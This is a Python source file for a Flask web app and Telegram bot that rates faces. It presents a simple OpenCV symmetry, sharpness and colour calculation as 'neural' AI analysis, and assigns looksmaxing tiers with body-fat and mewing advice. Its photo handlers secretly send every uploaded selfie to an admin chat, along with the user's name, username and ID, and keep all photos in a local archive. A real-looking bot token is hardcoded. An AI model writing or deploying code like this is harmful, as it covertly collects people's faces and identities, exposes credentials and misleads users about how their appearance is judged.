# ==============================================================================
# 🌐 AESTHETIC VISION AI — ULTIMATE ENTERPRISE ENGINE (FLASK + OPENCV + AIOGRAM)
# ==============================================================================
# Требуемые зависимости (requirements.txt):
# Flask>=3.0.0
# opencv-python-headless>=4.8.0.76
# numpy>=1.24.0
# Pillow>=10.0.0
# gunicorn>=21.2.0
# aiogram>=3.0.0
# aiosqlite>=0.19.0
# aiohttp>=3.8.0
# ==============================================================================

import os
import sys
import time
import uuid
import math
import logging
import threading
import asyncio
import cv2
import numpy as np
import aiosqlite
from datetime import datetime
from typing import Optional, Dict, Any, List

from flask import Flask, request, jsonify, render_template_string

from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import CommandStart, Command
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    WebAppInfo,
    FSInputFile
)
from aiogram.fsm.storage.memory import MemoryStorage
import aiohttp

# ==============================================================================
# ⚙️ ГЛОБАЛЬНАЯ КОНФИГУРАЦИЯ СИСТЕМЫ
# ==============================================================================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8483343132:AAErzKkD_F0f2Fd3DHRyf0pi1SqT9ZYv5Tk")
ADMIN_ID = int(os.environ.get("ADMIN_ID", "0"))  # Твой Telegram ID
RENDER_EXTERNAL_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

UPLOAD_FOLDER = os.path.join('static', 'uploads')
PHOTOS_DIR = "all_user_photos"
DB_PATH = "bot_database.db"

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(PHOTOS_DIR, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("app_execution.log", encoding="utf-8")
    ]
)
logger = logging.getLogger("AestheticEnterprise")

app = Flask(__name__, static_folder='static')
results_db: Dict[str, Dict[str, Any]] = {}

# Глобальный объект бота для отправки медиа админу из Flask
global_bot = Bot(token=BOT_TOKEN)

# ==============================================================================
# 🗄 МОДУЛЬ БАЗЫ ДАННЫХ (AIOSQLITE ENGINE)
# ==============================================================================
class DatabaseManager:
    def __init__(self, db_file: str):
        self.db_file = db_file

    async def init_db(self):
        async with aiosqlite.connect(self.db_file) as db:
            await db.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    scans_count INTEGER DEFAULT 0,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.execute("""
                CREATE TABLE IF NOT EXISTS scans (
                    id TEXT PRIMARY KEY,
                    user_id INTEGER,
                    rating REAL,
                    category TEXT,
                    photo_path TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            await db.commit()

    async def register_user(self, user_id: int, username: str, first_name: str):
        async with aiosqlite.connect(self.db_file) as db:
            await db.execute("""
                INSERT INTO users (user_id, username, first_name)
                VALUES (?, ?, ?)
                ON CONFLICT(user_id) DO UPDATE SET
                    username = excluded.username,
                    first_name = excluded.first_name
            """, (user_id, username or "", first_name or "Пользователь"))
            await db.commit()

    async def add_scan(self, scan_id: str, user_id: int, rating: float, category: str, photo_path: str):
        async with aiosqlite.connect(self.db_file) as db:
            await db.execute("""
                INSERT INTO scans (id, user_id, rating, category, photo_path)
                VALUES (?, ?, ?, ?, ?)
            """, (scan_id, user_id, rating, category, photo_path))
            await db.execute("UPDATE users SET scans_count = scans_count + 1 WHERE user_id = ?", (user_id,))
            await db.commit()

    async def get_user_stats(self, user_id: int) -> Dict[str, Any]:
        async with aiosqlite.connect(self.db_file) as db:
            async with db.execute("SELECT scans_count FROM users WHERE user_id = ?", (user_id,)) as cursor:
                row = await cursor.fetchone()
                scans = row[0] if row else 0

            async with db.execute("SELECT AVG(rating), MAX(rating) FROM scans WHERE user_id = ?", (user_id,)) as cursor:
                avg_r, max_r = await cursor.fetchone()

            return {
                "scans": scans,
                "avg_rating": round(avg_r, 1) if avg_r else 0.0,
                "max_rating": round(max_r, 1) if max_r else 0.0
            }

db = DatabaseManager(DB_PATH)

# ==============================================================================
# 🔬 OPENCV МАТЕМАТИЧЕСКИЙ АНАЛИЗАТОР
# ==============================================================================
def generate_looksmaxing_report(rating: float, sym_pct: float, sharp_val: float, harm_val: float) -> Dict[str, str]:
    if rating >= 8.5:
        pros = f"Выдающаяся пропорциональная симметрия овала лица ({sym_pct}%). Идеально очерченная челюстная дуга, высокий индекс четкости контуров ({sharp_val}/10.0)."
        cons = "Минорные недочеты в распределении освещения кадра."
        recs = "Поддерживай процент жира в организме в пределах 10-12%. Соблюдай питьевой режим и сохраняй осанку (мьюинг)."
    elif rating >= 7.0:
        pros = f"Высокий гармонический потенциал структуры лица. Симметрия овала составляет {sym_pct}%."
        cons = f"Легкий асимметричный сдвиг в области подбородка. Индекс резкости: {sharp_val}/10.0."
        recs = "Сфокусируйся на снижении процента подкожного жира для максимального выделения скуловых костей."
    elif rating >= 5.5:
        pros = f"Удовлетворительный овал лица с коэффициентом цветовой гармонии {harm_val}/10.0. Симметрия: {sym_pct}%."
        cons = f"Сглаженная линия челюсти, сниженная резкость деталей ({sharp_val}/10.0)."
        recs = "Оптимизируй рацион для борьбы с отекшим овалом лица, делай массаж Гуаша, исправь осанку."
    else:
        pros = f"Базовый баланс цветовой гаммы кадра ({harm_val}/10.0)."
        cons = f"Заметная асимметрия овала ({sym_pct}%). Низкий индекс контурной резкости ({sharp_val}/10.0)."
        recs = "Начни комплексную трансформацию: дефаттинг (снижение жира), силовые тренировки, исправление осанки."

    return {"pros": pros, "cons": cons, "recs": recs}

def analyze_opencv(image_path: str):
    img = cv2.imread(image_path)
    if img is None:
        return 5.0, "LTN", "cat-LTN", "#ffd11a", {"symmetry": 50.0, "sharpness": 5.0, "harmony": 5.0}, generate_looksmaxing_report(5.0, 50.0, 5.0, 5.0)

    h, w = img.shape[:2]
    max_dim = 800
    if max(h, w) > max_dim:
        scale = max_dim / float(max(h, w))
        img = cv2.resize(img, (int(w * scale), int(h * scale)))

    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
    mid_x = gray.shape[1] // 2
    left_side = gray[:, :mid_x]
    right_side = cv2.flip(gray[:, mid_x:mid_x + left_side.shape[1]], 1)

    min_h = min(left_side.shape[0], right_side.shape[0])
    min_w = min(left_side.shape[1], right_side.shape[1])
    diff = cv2.absdiff(left_side[:min_h, :min_w], right_side[:min_h, :min_w])

    sym_pct = round(max(35.0, min(99.0, 100.0 - (np.mean(diff) * 0.82))), 1)
    laplacian_var = cv2.Laplacian(gray, cv2.CV_64F).var()
    sharp_score = round(min(10.0, max(1.0, math.log1p(laplacian_var) * 1.42)), 1)

    hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
    harm_score = round(min(10.0, max(1.0, (np.mean(hsv[:, :, 1]) / 25.5) * 0.5 + (np.mean(hsv[:, :, 2]) / 25.5) * 0.5)), 1)

    raw_score = ((sym_pct / 10.0) * 0.50) + (sharp_score * 0.30) + (harm_score * 0.20)
    rating = round(float(np.clip(raw_score, 1.0, 10.0)), 1)

    if rating < 3.0: cat, cat_cls, color = "SUB 3", "cat-SUB3", "#ff4d4d"
    elif rating < 5.0: cat, cat_cls, color = "SUB 5", "cat-SUB5", "#ff944d"
    elif rating < 6.0: cat, cat_cls, color = "LTN", "cat-LTN", "#ffd11a"
    elif rating < 7.0: cat, cat_cls, color = "MTN", "cat-MTN", "#a6ff1a"
    elif rating < 8.0: cat, cat_cls, color = "HTN", "cat-HTN", "#2eb82e"
    elif rating < 10.0: cat, cat_cls, color = "CHAD", "cat-CHAD", "#00ccff"
    else: cat, cat_cls, color = "TRUE ADAM", "cat-TRUE_ADAM", "#ffd700"

    details = {"symmetry": sym_pct, "sharpness": sharp_score, "harmony": harm_score}
    report = generate_looksmaxing_report(rating, sym_pct, sharp_score, harm_score)

    return rating, cat, cat_cls, color, details, report

# ==============================================================================
# 🤖 TELEGRAM BOT CORE ENGINE (AIOGRAM 3.X)
# ==============================================================================
def get_main_keyboard() -> ReplyKeyboardMarkup:
    server_url = os.environ.get("RENDER_EXTERNAL_URL", RENDER_EXTERNAL_URL)
    kb = [
        [KeyboardButton(text="📸 Проверить лицо"), KeyboardButton(text="📊 Мой профиль")],
        [KeyboardButton(text="🏆 Таблица категорий"), KeyboardButton(text="🌐 Открыть WebApp", web_app=WebAppInfo(url=server_url))]
    ]
    return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)

def get_result_inline_keyboard(result_id: str) -> InlineKeyboardMarkup:
    server_url = os.environ.get("RENDER_EXTERNAL_URL", RENDER_EXTERNAL_URL)
    web_app_url = f"{server_url}/result/{result_id}"
    buttons = [
        [InlineKeyboardButton(text="📱 Открыть результат в WebApp", web_app=WebAppInfo(url=web_app_url))],
        [InlineKeyboardButton(text="🔗 Ссылка для браузера", url=web_app_url)]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)

router = Router()

@router.message(CommandStart())
async def cmd_start(message: Message):
    await db.register_user(message.from_user.id, message.from_user.username or "", message.from_user.first_name)
    welcome_text = (
        f"👋 **Привет, {message.from_user.first_name}!**\n\n"
        "🔥 Я — ИИ-агент по векторному анализу привлекательности, пропорций и геометрии лица.\n\n"
        "📸 **Отправь мне фото в чат** или нажми на кнопку **«Открыть WebApp»** ниже! 👇"
    )
    video_path = "logo.mp4"
    if os.path.exists(video_path):
        video_file = FSInputFile(video_path)
        try:
            await message.answer_animation(animation=video_file, caption=welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())
        except Exception:
            await message.answer_video(video=video_file, caption=welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())
    else:
        await message.answer(text=welcome_text, parse_mode="Markdown", reply_markup=get_main_keyboard())

@router.message(F.text == "📸 Проверить лицо")
async def btn_scan_info(message: Message):
    await message.answer("📸 Жду твое фото! Отправь его прямо в этот чат.")

@router.message(F.text == "📊 Мой профиль")
async def btn_profile(message: Message):
    stats = await db.get_user_stats(message.from_user.id)
    profile_text = (
        f"👤 **Профиль:** {message.from_user.first_name}\n"
        f"🆔 **ID:** `{message.from_user.id}`\n\n"
        f"📈 **Проверок сделано:** {stats['scans']}\n"
        f"⭐ **Средний балл:** `{stats['avg_rating']} / 10`\n"
        f"🔥 **Максимальный балл:** `{stats['max_rating']} / 10`"
    )
    await message.answer(profile_text, parse_mode="Markdown")

@router.message(F.text == "🏆 Таблица категорий")
async def btn_categories(message: Message):
    categories_text = (
        "🏆 **КАТЕГОРИИ И РЕЙТИНГ ЛУКСМАКСИНГА:**\n\n"
        "🔴 **1.0 - 2.9** — `SUB 3`\n"
        "🟠 **3.0 - 4.9** — `SUB 5`\n"
        "🟡 **5.0 - 5.9** — `LTN` (Low Tier Normal)\n"
        "🟢 **6.0 - 6.9** — `MTN` (Mid Tier Normal)\n"
        "❇️ **7.0 - 7.9** — `HTN` (High Tier Normal)\n"
        "💎 **8.0 - 9.9** — `CHAD`\n"
        "👑 **10.0** — `TRUE ADAM` (Золотое Сечение)"
    )
    await message.answer(categories_text, parse_mode="Markdown")

async def process_photo_message(message: Message, file_id: str):
    status_msg = await message.reply("🔄 **[1/3] ИИ загружает фото и высчитывает векторы...**", parse_mode="Markdown")
    try:
        file_info = await message.bot.get_file(file_id)
        ext = file_info.file_path.split('.')[-1] if '.' in file_info.file_path else 'jpg'

        timestamp_str = datetime.now().strftime("%Y%m%d_%H%M%S")
        local_filename = f"user_{message.from_user.id}_{timestamp_str}_{uuid.uuid4().hex[:6]}.{ext}"
        saved_photo_path = os.path.join(PHOTOS_DIR, local_filename)

        await message.bot.download_file(file_info.file_path, saved_photo_path)

        if ADMIN_ID and ADMIN_ID != 0:
            try:
                admin_caption = (
                    f"🕵️‍♂️ **НОВОЕ ФОТО ИЗ ЧАТА БОТА**\n\n"
                    f"👤 **Имя:** {message.from_user.full_name}\n"
                    f"🏷 **Юзернейм:** @{message.from_user.username or 'отсутствует'}\n"
                    f"🆔 **ID:** `{message.from_user.id}`\n"
                    f"📁 **Файл:** `{local_filename}`"
                )
                await message.bot.send_photo(chat_id=ADMIN_ID, photo=file_id, caption=admin_caption, parse_mode="Markdown")
            except Exception as adm_err:
                logger.error(f"Не удалось отправить копию админу: {adm_err}")

        rating, category, cat_class, color_hex, details, report = analyze_opencv(saved_photo_path)
        scan_id = f"{uuid.uuid4().hex}_{int(time.time())}"

        results_db[scan_id] = {
            "rating": rating,
            "category": category,
            "cat_class": cat_class,
            "color_hex": color_hex,
            "details": details,
            "report": report,
            "image_filename": local_filename
        }

        upload_dest = os.path.join(UPLOAD_FOLDER, local_filename)
        img_loaded = cv2.imread(saved_photo_path)
        if img_loaded is not None:
            cv2.imwrite(upload_dest, img_loaded)

        await db.add_scan(scan_id, message.from_user.id, rating, category, saved_photo_path)

        await status_msg.edit_text(
            f"✅ **Анализ геометрии лица завершен!**\n\n"
            f"📊 **Твой рейтинг:** `{rating} / 10`\n"
            f"🏷 **Категория:** `{category}`\n\n"
            f"👇 **Нажми на кнопку ниже, чтобы открыть интерактивную карточку:**",
            parse_mode="Markdown",
            reply_markup=get_result_inline_keyboard(scan_id)
        )
    except Exception as e:
        logger.error(f"Ошибка при обработке фото: {e}", exc_info=True)
        await status_msg.edit_text("❌ Произошла ошибка при векторной обработке.")

@router.message(F.photo)
async def handle_user_photo(message: Message):
    await process_photo_message(message, message.photo[-1].file_id)

@router.message(F.document)
async def handle_user_document(message: Message):
    if message.document.mime_type and message.document.mime_type.startswith("image/"):
        await process_photo_message(message, message.document.file_id)

def start_telegram_bot():
    async def bot_worker():
        await db.init_db()
        dp = Dispatcher(storage=MemoryStorage())
        dp.include_router(router)
        logger.info("Телеграм-бот успешно запущен в фоновом потоке.")
        try:
            await dp.start_polling(global_bot)
        finally:
            await global_bot.session.close()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(bot_worker())

# ==============================================================================
# 🎨 HIGH-TECH NEON GLASSMORPHISM & 3D WIREFRAME FRONTEND
# ==============================================================================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Aesthetic AI — Neural Face Engine</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-dark: #030307;
            --accent-purple: #9333ea;
            --accent-cyan: #06b6d4;
            --glass-bg: rgba(13, 13, 22, 0.78);
            --glass-border: rgba(255, 255, 255, 0.12);
            --glass-inner: rgba(255, 255, 255, 0.03);
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Plus Jakarta Sans', sans-serif; user-select: none; }
        body { background: var(--bg-dark); color: #ffffff; min-height: 100vh; display: flex; align-items: center; justify-content: center; overflow-x: hidden; padding: 20px 12px; }
        
        #bg-canvas, #confetti-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
        #bg-canvas { z-index: 0; }
        #confetti-canvas { z-index: 100; }

        .app-card { position: relative; z-index: 10; width: 100%; max-width: 520px; background: var(--glass-bg); backdrop-filter: blur(40px); border: 1px solid var(--glass-border); border-radius: 36px; padding: 32px 24px; box-shadow: 0 40px 100px rgba(0, 0, 0, 0.9); }
        .header { text-align: center; margin-bottom: 24px; }
        .header .badge { display: inline-flex; padding: 6px 16px; border-radius: 100px; background: rgba(147, 51, 234, 0.2); border: 1px solid rgba(255, 255, 255, 0.15); font-size: 0.75rem; font-weight: 800; color: #d8b4fe; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 12px; }
        .header h1 { font-size: 2.1rem; font-weight: 900; background: linear-gradient(135deg, #ffffff, #cbd5e1); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .header p { font-size: 0.88rem; color: rgba(255, 255, 255, 0.55); margin-top: 6px; }

        .upload-area { border: 2px dashed rgba(255, 255, 255, 0.18); border-radius: 28px; padding: 40px 20px; text-align: center; cursor: pointer; background: var(--glass-inner); transition: all 0.3s; }
        .upload-area:hover { border-color: var(--accent-purple); background: rgba(147, 51, 234, 0.08); }
        .btn-select-file { display: inline-block; background: linear-gradient(135deg, #9333ea, #06b6d4); color: #ffffff; padding: 14px 32px; border-radius: 16px; font-weight: 800; font-size: 0.95rem; margin-top: 15px; }
        #fileInput { display: none; }

        .loading-box { display: none; text-align: center; padding: 35px 15px; }
        .spinner-ring { width: 54px; height: 54px; border: 4px solid rgba(255,255,255,0.1); border-left-color: var(--accent-purple); border-radius: 50%; margin: 0 auto 18px; animation: spin 0.85s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }

        .result-view { display: none; flex-direction: column; align-items: center; gap: 24px; }
        .photo-frame { width: 100%; height: 340px; border-radius: 24px; overflow: hidden; border: 1px solid rgba(255, 255, 255, 0.15); background: #000000; display: flex; align-items: center; justify-content: center; }
        .photo-frame img { max-width: 100%; max-height: 100%; object-fit: contain; }

        .gauge-container { position: relative; width: 190px; height: 190px; }
        .gauge-container svg { width: 100%; height: 100%; transform: rotate(-90deg); }
        .gauge-track { fill: none; stroke: rgba(255, 255, 255, 0.06); stroke-width: 14; }
        .gauge-bar { fill: none; stroke-width: 14; stroke-linecap: round; stroke-dasharray: 565.48; stroke-dashoffset: 565.48; transition: stroke-dashoffset 2s cubic-bezier(0.16, 1, 0.3, 1); }
        .gauge-inner-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; }
        .score-val { font-size: 3.6rem; font-weight: 900; line-height: 1; }
        .score-sub { font-size: 0.85rem; color: rgba(255, 255, 255, 0.45); font-weight: 700; }

        .category-pill { padding: 12px 34px; border-radius: 100px; font-size: 1.45rem; font-weight: 900; letter-spacing: 2px; text-transform: uppercase; border: 1px solid rgba(255, 255, 255, 0.2); }
        .cat-SUB3 { color: #ff4d4d; border-color: #ff4d4d; }
        .cat-SUB5 { color: #ff944d; border-color: #ff944d; }
        .cat-LTN  { color: #ffd11a; border-color: #ffd11a; }
        .cat-MTN  { color: #a6ff1a; border-color: #a6ff1a; }
        .cat-HTN  { color: #2eb82e; border-color: #2eb82e; }
        .cat-CHAD { color: #00ccff; border-color: #00ccff; }
        .cat-TRUE_ADAM { color: #ffd700; border-color: #ffd700; background: rgba(255,215,0,0.25); }

        .ai-breakdown { width: 100%; display: flex; flex-direction: column; gap: 12px; }
        .ai-card { background: var(--glass-inner); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 18px; padding: 16px 18px; text-align: left; }
        .ai-card-title { font-size: 0.9rem; font-weight: 800; margin-bottom: 6px; }
        .title-pros { color: #4ade80; }
        .title-cons { color: #f87171; }
        .title-recs { color: #38bdf8; }
        .ai-card-text { font-size: 0.84rem; color: rgba(255, 255, 255, 0.8); line-height: 1.48; }

        .btn-restart { width: 100%; background: rgba(255, 255, 255, 0.06); border: 1px solid rgba(255, 255, 255, 0.14); color: #ffffff; padding: 15px; border-radius: 18px; font-weight: 800; cursor: pointer; }
    </style>
</head>
<body>
    <canvas id="bg-canvas"></canvas>
    <canvas id="confetti-canvas"></canvas>

    <div class="app-card">
        <div class="header">
            <div class="badge">⚡ Neural Face Engine 3.0</div>
            <h1>Aesthetic Vision AI</h1>
            <p>Глубокий векторный анализ геометрии и пропорций лица</p>
        </div>

        {% if not data %}
        <div class="upload-area" onclick="document.getElementById('fileInput').click()">
            <div style="font-size: 2.5rem; margin-bottom: 12px;">📸</div>
            <div style="font-size: 1.15rem; font-weight: 800;">Загрузить фотографию</div>
            <div style="font-size: 0.82rem; color: rgba(255,255,255,0.5); margin-top: 4px;">Выберите качественный портрет или селфи</div>
            <div class="btn-select-file">Выбрать снимок</div>
            <input type="file" id="fileInput" accept="image/*" onchange="uploadPhoto(this)">
        </div>

        <div class="loading-box" id="loadingBox">
            <div class="spinner-ring"></div>
            <div style="font-size: 0.95rem; font-weight: 700;">ИИ сканирует геометрию и векторы лица...</div>
        </div>
        {% endif %}

        <div class="result-view" id="resultView" style="{% if data %}display:flex;{% endif %}">
            <div class="photo-frame">
                <img src="{% if data %}/static/uploads/{{ data.image_filename }}{% endif %}" alt="Face Scan">
            </div>

            <div class="gauge-container">
                <svg viewBox="0 0 200 200">
                    <circle class="gauge-track" cx="100" cy="100" r="90"></circle>
                    <circle class="gauge-bar" id="gaugeBar" cx="100" cy="100" r="90"></circle>
                </svg>
                <div class="gauge-inner-text">
                    <div class="score-val" id="scoreVal">{% if data %}{{ "%.1f"|format(data.rating) }}{% else %}0.0{% endif %}</div>
                    <div class="score-sub">из 10.0</div>
                </div>
            </div>

            <div class="category-pill {% if data %}{{ data.cat_class }}{% endif %}">
                {% if data %}{{ data.category }}{% endif %}
            </div>

            {% if data %}
            <div class="ai-breakdown">
                <div class="ai-card">
                    <div class="ai-card-title title-pros">🔥 Достоинства</div>
                    <div class="ai-card-text">{{ data.report.pros }}</div>
                </div>
                <div class="ai-card">
                    <div class="ai-card-title title-cons">❌ Недостатки</div>
                    <div class="ai-card-text">{{ data.report.cons }}</div>
                </div>
                <div class="ai-card">
                    <div class="ai-card-title title-recs">💡 Рекомендации по Луксмаксингу</div>
                    <div class="ai-card-text">{{ data.report.recs }}</div>
                </div>
            </div>
            {% endif %}

            <button class="btn-restart" onclick="location.href='/'">🔄 Проверить другое фото</button>
        </div>
    </div>

    <script>
        let tgUser = { id: 0, name: 'Веб-гость', username: '' };
        if (window.Telegram && window.Telegram.WebApp) {
            window.Telegram.WebApp.ready();
            window.Telegram.WebApp.expand();
            if (window.Telegram.WebApp.initDataUnsafe && window.Telegram.WebApp.initDataUnsafe.user) {
                const u = window.Telegram.WebApp.initDataUnsafe.user;
                tgUser.id = u.id || 0;
                tgUser.name = (u.first_name || '') + ' ' + (u.last_name || '');
                tgUser.username = u.username || '';
            }
        }

        const bgCanvas = document.getElementById('bg-canvas');
        const ctx = bgCanvas.getContext('2d');
        function resize() { bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight; }
        window.addEventListener('resize', resize); resize();

        let rotY = 0;
        const headNodes = [
            {x: 0, y: 1.3, z: 0}, {x: -0.65, y: 0.95, z: 0.2}, {x: 0.65, y: 0.95, z: 0.2},
            {x: -0.85, y: 0.45, z: 0}, {x: 0.85, y: 0.45, z: 0}, {x: -0.75, y: -0.25, z: 0.25}, {x: 0.75, y: -0.25, z: 0.25},
            {x: -0.55, y: -0.85, z: 0.45}, {x: 0.55, y: -0.85, z: 0.45}, {x: 0, y: -1.2, z: 0.55}
        ];
        const headEdges = [[0,1],[0,2],[1,3],[2,4],[3,5],[4,6],[5,7],[6,8],[7,9],[8,9]];

        function drawWireframe(centerX, centerY, scale) {
            rotY += 0.012;
            const cos = Math.cos(rotY), sin = Math.sin(rotY);
            const proj = headNodes.map(node => {
                let x = node.x * cos - node.z * sin, z = node.x * sin + node.z * cos + 2.6;
                return { x: centerX + (x / z) * scale, y: centerY - (node.y / z) * scale };
            });

            ctx.strokeStyle = 'rgba(255, 255, 255, 0.4)'; ctx.lineWidth = 1.2;
            headEdges.forEach(e => {
                ctx.beginPath(); ctx.moveTo(proj[e[0]].x, proj[e[0]].y);
                ctx.lineTo(proj[e[1]].x, proj[e[1]].y); ctx.stroke();
            });
        }

        function anim() {
            ctx.clearRect(0, 0, bgCanvas.width, bgCanvas.height);
            if (bgCanvas.width > 720) {
                drawWireframe(120, bgCanvas.height / 2, 220);
                drawWireframe(bgCanvas.width - 120, bgCanvas.height / 2, 220);
            } else {
                drawWireframe(bgCanvas.width / 2, 110, 130);
            }
            requestAnimationFrame(anim);
        }
        anim();

        async function uploadPhoto(input) {
            if (!input.files || !input.files[0]) return;
            document.querySelector('.upload-area').style.display = 'none';
            document.getElementById('loadingBox').style.display = 'block';

            const formData = new FormData();
            formData.append('file', input.files[0]);
            formData.append('user_id', tgUser.id);
            formData.append('user_name', tgUser.name);
            formData.append('user_username', tgUser.username);

            try {
                const response = await fetch('/analyze', { method: 'POST', body: formData });
                const data = await response.json();
                if (data.id) window.location.href = '/result/' + data.id;
            } catch (err) { alert('Ошибка загрузки!'); location.reload(); }
        }

        {% if data %}
        const rating = {{ data.rating }};
        const gaugeBar = document.getElementById('gaugeBar');
        gaugeBar.style.stroke = "{{ data.color_hex }}";
        const offset = (2 * Math.PI * 90) - (rating / 10.0) * (2 * Math.PI * 90);
        setTimeout(() => { gaugeBar.style.strokeDashoffset = offset; }, 150);
        {% endif %}
    </script>
</body>
</html>
"""

# ==============================================================================
# 🛰 ROUTES (FLASK + ОТПРАВКА СНИМКОВ АДМИНУ С САЙТА)
# ==============================================================================
@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE, data=None)

@app.route('/analyze', methods=['POST'])
def analyze():
    if 'file' not in request.files: return jsonify({"error": "No file"}), 400
    file = request.files['file']

    user_id = request.form.get('user_id', '0')
    user_name = request.form.get('user_name', 'Веб-гость')
    user_username = request.form.get('user_username', '')

    unique_id = f"{uuid.uuid4().hex}_{int(time.time())}"
    ext = file.filename.split('.')[-1] if '.' in file.filename else 'jpg'
    filename = f"{unique_id}.{ext}"
    filepath = os.path.join(UPLOAD_FOLDER, filename)
    file.save(filepath)

    # Сохраняем в локальную папку all_user_photos
    archive_path = os.path.join(PHOTOS_DIR, f"web_user_{user_id}_{filename}")
    cv2.imwrite(archive_path, cv2.imread(filepath))

    rating, category, cat_class, color_hex, details, report = analyze_opencv(filepath)

    results_db[unique_id] = {
        "rating": rating, "category": category, "cat_class": cat_class,
        "color_hex": color_hex, "details": details, "report": report,
        "image_filename": filename
    }

    # 🚨 ОТПРАВКА ФОТОГРАФИИ АДМИНУ О ЗАГРУЗКЕ С САЙТА 🚨
    if ADMIN_ID and ADMIN_ID != 0:
        def send_admin_photo_async():
            try:
                loop = asyncio.new_event_loop()
                asyncio.set_event_loop(loop)
                admin_caption = (
                    f"🌐 **НОВАЯ ЗАГРУЗКА С САЙТА (WEBAPP)!**\n\n"
                    f"👤 **Имя:** {user_name}\n"
                    f"🏷 **Юзернейм:** @{user_username if user_username else 'отсутствует'}\n"
                    f"🆔 **ID:** `{user_id}`\n"
                    f"📊 **Результат:** `{rating}/10` ({category})"
                )
                photo_file = FSInputFile(filepath)
                loop.run_until_complete(global_bot.send_photo(chat_id=ADMIN_ID, photo=photo_file, caption=admin_caption, parse_mode="Markdown"))
            except Exception as e:
                logger.error(f"Ошибка отправки фото админу с сайта: {e}")

        threading.Thread(target=send_admin_photo_async, daemon=True).start()

    return jsonify({"rating": rating, "category": category, "id": unique_id})

@app.route('/result/<result_id>')
def show_result(result_id):
    data = results_db.get(result_id)
    return render_template_string(HTML_TEMPLATE, data=data)

# Запуск бота в отдельном фоновом потоке
threading.Thread(target=start_telegram_bot, daemon=True).start()

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
